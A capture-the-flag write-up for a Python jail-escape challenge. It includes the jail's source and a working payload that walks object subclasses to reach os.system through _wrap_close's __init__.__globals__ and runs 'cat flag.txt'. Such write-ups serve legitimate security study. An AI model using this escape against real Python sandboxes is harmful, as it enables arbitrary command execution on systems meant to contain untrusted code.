# Writeup: Prison Break Level 3
Category: Python Jail Escape

**Challenge Description**

You are caught again, and the warden confiscated all your tools. This time, the restrictions are even stricter:  
- Input length limited to **256 characters**  
- Only **printable characters** allowed  
- Most builtins (`sys`, `os`, `import`, etc.) are **removed**  
- All modules (`sys.modules`) are **deleted**  
- Global and local namespaces are **cleared**  

You are given the source code used in the challenge to view what warden has done to you after being caught for the third time.

**Goal:** Bypass these restrictions and execute arbitrary commands (e.g., `cat flag.txt`).  

**Hint:**  
> *"Check this: `x.__init__.__globals__` and call what you have found in `_wrap_close` for example: `os['system']('cat flag.txt')`"*  

**TL;DR:**  

To bypass the restrictions, we:  
1. **Found `_wrap_close`** (a class in `io` module) via `().__class__.__base__.__subclasses__()`.  
2. Accessed its `__init__.__globals__` to retrieve the **`os` module**.  
3. Called `os.system('cat flag.txt')` to read the flag.  

**Final Payload:**  
```python
print([x for x in (1).__class__.__base__.__subclasses__() if '_wrap_close' in x.__name__][0].__init__.__globals__['system']('cat flag.txt'))
```  
**Flag:**
`CITU{y0u_re4lly_4r3_pr1s0n_br34k3r_ret_wants_to_meet_you_soon!!!!}`

---

**jail.py source code**
```python
#!/usr/local/bin/python

import os
import sys
import string

print("="*40)
print("Welcome to the prison break level 3")
print("="*40)
print("Warden: Ohoy!! you are being caught again.")
print("Warden: I found out that you escaped at level 2, now I will confiscate all your tools here.")
print("Warden: I will also make sure that you won't be able to escape again. BWAHAHA!!")
print("="*40)
print("---- TIPS from 'ret' who escaped and now he is in katipwnan ----")
print("1. Steal back the tools from the prison's server.")
print("2. Warden is careless, your tools are still in the prison.")
print("----------------------------------------------------------------")
hax = input("> ")
sys.stdin.close()

if len(hax) > 256 or any(x not in string.printable for x in hax):
    print("In here your tools was replaced...")
    exit(1)

code = f"""
import sys
import os
import inspect

if "_posixsubprocess" in sys.modules:
    print("nope 2")
    os._exit(1)

for k in list(sys.modules):
    del sys.modules[k]

f = inspect.currentframe()

for k in f.f_builtins:
    if k == "print":
        continue
    if k == "dir":
        continue
    if k == "Exception":
        continue
    f.f_builtins[k] = None

for k in f.f_globals:
    if k != "f":
        f.f_globals[k] = None
for k in f.f_locals:
    # print(k, f.f_locals[k])
    f.f_locals[k] = None

{hax}
""".strip()

os.execv(sys.executable, [sys.executable, "-c", code])
```

### Approach 

**1. Now What Are The Restrictions This Time?**

Warden confiscated all my tools, meaning:
- **No direct imports** (`import os` is blocked).  
- **No builtins** (`sys`, `os`, `open`, etc. are removed).  
- **No dangerous strings** (but no explicit keyword filter here).  
- **Only `print`, `dir`, and `Exception` remain usable.**  

**2. Finding A Way to Access `os`**

Since `os` is blocked, we need an **indirect way** to access it. The hint suggests:
> `x.__init__.__globals__`  

This means we can:
- Find a class (`x`) that has `os` in its `__globals__`.  
- The hint specifically mentions `_wrap_close` (a class in Python’s `io` module).  

**3. Getting `_wrap_close` via Subclasses**

- All Python classes inherit from `object`.  
- We can list all subclasses of `object` using:

  ```python
  ().__class__.__base__.__subclasses__()
  ```  
- We search for a class with `'_wrap_close'` in its name.  

**4. Accessing `os` from `_wrap_close`**

Once we find `_wrap_close`, we:  
1. Access its `__init__` method.  
2. Check `__globals__` (contains module-level variables, including `os`).  
3. Call `system('cat flag.txt')`.  

**5. Final Payload Construction**

```python
# Find _wrap_close class
_wrap_close = [x for x in (1).__class__.__base__.__subclasses__() if '_wrap_close' in x.__name__][0]

# Access os.system via __globals__
_wrap_close.__init__.__globals__['system']('cat flag.txt')
```

**6. Escaping The Jail For Real This Time (Getting The Flag)🚩**

Since the input length is limited to 256 characters, we are going to shorten the payload.
**Shortened to fit 256 chars:**  
```python
print([x for x in (1).__class__.__base__.__subclasses__() if '_wrap_close' in x.__name__][0].__init__.__globals__['system']('cat flag.txt'))
```
After inputting the payload, we now got the flag
> CITU{y0u_re4lly_4r3_pr1s0n_br34k3r_ret_wants_to_meet_you_soon!!!!}

### Reflections
Learned a lot about deep Python internals, seems like I still do not know Python that much. Escaping jail is actually hard😥.

Also, most of the logic to find the answer of this CTF is through **AI**.

---

[**Back to Home**](/)
